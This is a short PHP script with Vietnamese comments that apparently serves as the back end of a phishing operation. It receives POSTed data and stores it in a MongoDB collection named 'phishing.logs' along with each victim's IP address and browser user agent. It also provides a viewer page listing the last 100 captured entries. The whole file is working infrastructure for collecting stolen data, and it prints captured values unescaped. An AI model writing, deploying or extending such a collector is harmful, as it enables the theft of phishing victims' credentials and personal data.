<?php
header('Content-Type: text/html; charset=utf-8');
mb_internal_encoding('UTF-8');

// Kết nối MongoDB (cần cài mongodb extension hoặc dùng REST API)
$conn_string = "mongodb+srv://user:pass@cluster.mongodb.net/";
$client = new MongoDB\Client($conn_string);
$collection = $client->phishing->logs;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
    $raw_data = $_POST['data'];
    $decoded = json_decode($raw_data, true);
    
    $entry = [
        'time' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'data' => $decoded
    ];
    
    $collection->insertOne($entry);
    echo 'OK';
    exit;
}

// Hiển thị viewer
$logs = $collection->find([], ['sort' => ['time' => -1], 'limit' => 100]);
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Viewer</title></head><body>";
echo "<h2>Data collected</h2><pre>";
foreach ($logs as $log) {
    print_r($log);
    echo "\n" . str_repeat('-', 80) . "\n";
}
echo "</pre></body></html>";
?>